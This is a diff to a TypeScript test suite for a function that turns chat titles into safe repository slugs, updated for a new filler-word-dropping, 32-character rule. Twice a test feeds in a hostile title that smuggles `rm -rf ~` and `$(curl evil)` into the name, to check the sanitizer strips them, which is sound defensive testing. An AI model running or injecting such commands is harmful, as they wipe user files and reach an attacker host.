@@ -123,14 +123,14 @@ describe("sanitizeRepoName — hostile chat title → safe [a-z0-9-] slug (T-hak
     const hostile = `x"; rm -rf ~ $(curl evil) café ${"A".repeat(200)}`;
     const slug = sanitizeRepoName(hostile, fixedClock);
     expect(slug).toMatch(/^[a-z0-9-]+$/);
-    expect(slug.length).toBeLessThanOrEqual(80);
+    expect(slug.length).toBeLessThanOrEqual(32);
     expect(slug).not.toMatch(/[\s$();"~`]/);
     // No trailing hyphen after truncation.
     expect(slug.endsWith("-")).toBe(false);
   });
 
   it("produces readable slugs for normal titles", () => {
-    expect(sanitizeRepoName("Make a Counter App!", fixedClock)).toBe("make-a-counter-app");
+    expect(sanitizeRepoName("Make a Counter App!", fixedClock)).toBe("counter-app");
     expect(sanitizeRepoName("  Snake   Game  ", fixedClock)).toBe("snake-game");
   });
 
@@ -138,6 +138,80 @@ describe("sanitizeRepoName — hostile chat title → safe [a-z0-9-] slug (T-hak
     expect(sanitizeRepoName("", fixedClock)).toBe("vibe-20260711-0905");
     expect(sanitizeRepoName("   ", fixedClock)).toBe("vibe-20260711-0905");
     expect(sanitizeRepoName("!@#$%^&*()", fixedClock)).toBe("vibe-20260711-0905");
+  });
+});
+
+describe("sanitizeRepoName — concise condense rule (quick-260716-l6u)", () => {
+  it("condenses the motivating full prompt to <=4 meaningful words at word boundaries — never the 80-char monster", () => {
+    const prompt =
+      "a space simulation where we fly around the galaxy exploring beautiful planets stuff";
+    const slug = sanitizeRepoName(prompt, fixedClock);
+    // Fillers (a/the/we) dropped everywhere, first 4 remaining words, 26 chars.
+    expect(slug).toBe("space-simulation-where-fly");
+    expect(slug.length).toBeLessThanOrEqual(32);
+    expect(slug.endsWith("-")).toBe(false);
+    // NEVER the old 80-char mid-word truncation monster.
+    expect(slug).not.toBe(
+      "a-space-simulation-where-we-fly-around-the-galaxy-exploring-beautiful-planets-st",
+    );
+  });
+
+  it("drops filler words (a, an, the, please, make, create, build, can, you, we) before taking first words", () => {
+    expect(sanitizeRepoName("Make a Counter App!", fixedClock)).toBe("counter-app");
+    expect(sanitizeRepoName("can you build a calculator", fixedClock)).toBe("calculator");
+  });
+
+  it("an ALL-filler title falls back to the UNFILTERED first words — never empty, never the dated fallback", () => {
+    expect(sanitizeRepoName("make a build", fixedClock)).toBe("make-a-build");
+  });
+
+  it("caps at 32 chars by dropping trailing WHOLE words — never mid-word", () => {
+    const slug = sanitizeRepoName("extraordinary magnificent spectacular adventure", fixedClock);
+    expect(slug).toBe("extraordinary-magnificent");
+    expect(slug).toHaveLength(25);
+    // The result is a hyphen-boundary prefix of the full 4-word join.
+    const fullJoin = "extraordinary-magnificent-spectacular-adventure";
+    expect(fullJoin.startsWith(`${slug}-`)).toBe(true);
+    expect(slug.endsWith("-")).toBe(false);
+    expect(slug.length).toBeLessThanOrEqual(32);
+  });
+
+  it("a single mega-word (no word boundary exists) hard-slices to exactly 32 chars, no trailing hyphen", () => {
+    const slug = sanitizeRepoName("A".repeat(200), fixedClock);
+    expect(slug).toBe("a".repeat(32));
+    expect(slug).toHaveLength(32);
+    expect(slug.endsWith("-")).toBe(false);
+  });
+
+  it("dedupes a condensed base against knownNames — a DIFFERENT prompt colliding on the condensed base gets -2", async () => {
+    const { exec, calls } = captureExec();
+    const { fsx } = captureFs({ hasGit: false });
+    const store = fakeStore([[8, "counter-app"]]);
+    const publisher = createGalleryPublisher({
+      config: TEST_CONFIG,
+      store,
+      exec,
+      fsx,
+      logger: fakeLogger(),
+      now: fixedClock,
+    });
+
+    await publisher.publishNow({ generation: 1, title: "Make a Counter App", taskId: "t1" });
+
+    const create = calls.find((c) => c.file === "gh" && c.args.includes("create"));
+    expect(create?.args).toContain("TwitchVibecodes/counter-app-2");
+    expect(store.records).toEqual([[1, "counter-app-2"]]);
+  });
+
+  it("preserved behavior: snake-game, dated fallback trio, and the LOCKED [a-z0-9-] char class all hold", () => {
+    expect(sanitizeRepoName("Snake Game", fixedClock)).toBe("snake-game");
+    expect(sanitizeRepoName("", fixedClock)).toBe("vibe-20260711-0905");
+    expect(sanitizeRepoName("   ", fixedClock)).toBe("vibe-20260711-0905");
+    expect(sanitizeRepoName("!@#$%^&*()", fixedClock)).toBe("vibe-20260711-0905");
+    // Char rules LOCKED — output is [a-z0-9-] only, so the underscore-prefixed
+    // `_index-site` mirror stays unreachable by any chat-derived name.
+    const hostile = `x"; rm -rf ~ $(curl evil) café ${"A".repeat(200)}`;
+    expect(sanitizeRepoName(hostile, fixedClock)).toMatch(/^[a-z0-9-]+$/);
   });
 });
 
@@ -234,31 +308,27 @@ describe("createGalleryPublisher.publishNow — per-project routing", () => {
     });
 
     expect(result).toMatchObject({ status: "published", commitHash: "abc1234def" });
-    // Repo created under the configured owner with the sanitized name.
+    // Repo created under the configured owner with the sanitized CONDENSED name
+    // (quick-260716-l6u: "make"/"a" are fillers — the slug is "counter-app").
     const create = calls.find((c) => c.file === "gh");
-    expect(create?.args).toEqual([
-      "repo",
-      "create",
-      "TwitchVibecodes/make-a-counter-app",
-      "--public",
-    ]);
+    expect(create?.args).toEqual(["repo", "create", "TwitchVibecodes/counter-app", "--public"]);
     // Recorded ONLY after the create — keyed on generation.
-    expect(store.records).toEqual([[1, "make-a-counter-app"]]);
+    expect(store.records).toEqual([[1, "counter-app"]]);
     // Fresh mirror wired: init + remote add with a PLAIN https origin (no token).
     const remoteAdd = calls.find((c) => c.args.includes("remote"));
     expect(remoteAdd?.args).toEqual([
       "-C",
-      "data/gallery-mirror/make-a-counter-app",
+      "data/gallery-mirror/counter-app",
       "remote",
       "add",
       "origin",
-      "https://github.com/TwitchVibecodes/make-a-counter-app.git",
+      "https://github.com/TwitchVibecodes/counter-app.git",
     ]);
     // Snapshot copied from the UNC workspace generation dir into the repo root.
     expect(cpCalls).toEqual([
       {
         src: "\\\\wsl.localhost\\vibecoding-build\\home\\builder\\projects\\app-1",
-        dest: "data/gallery-mirror/make-a-counter-app",
+        dest: "data/gallery-mirror/counter-app",
       },
     ]);
   });
@@ -410,7 +480,8 @@ describe("createGalleryPublisher.publishNow — safety invariants", () => {
       }
     }
     const remoteAdd = calls.find((c) => c.args.includes("remote"));
-    expect(remoteAdd?.args.at(-1)).toBe("https://github.com/TwitchVibecodes/make-a-counter.git");
+    // quick-260716-l6u: "make"/"a" are fillers — the condensed slug is "counter".
+    expect(remoteAdd?.args.at(-1)).toBe("https://github.com/TwitchVibecodes/counter.git");
   });
 
   it("W1: DELETED workspace files disappear — non-.git entries are cleared before each copy (never rm the mirror root)", async () => {
